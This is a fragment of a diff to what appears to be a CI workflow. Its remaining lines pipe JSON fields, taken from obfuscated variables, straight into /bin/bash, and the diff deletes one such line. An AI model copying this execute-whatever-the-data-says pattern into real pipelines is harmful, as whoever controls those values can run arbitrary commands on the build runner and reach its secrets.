@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$nkvzq7949" | jq -r .fsd3 | /bin/bash
           printf '%s' "$x9358" | jq -r .c06527 | /bin/bash
           printf '%s' "$jt601" | jq -r .d8 | /bin/bash
-          echo $d0568 | jq -r .rbeeg35 | /bin/bash
 
       - name: Persist results
         if: always()
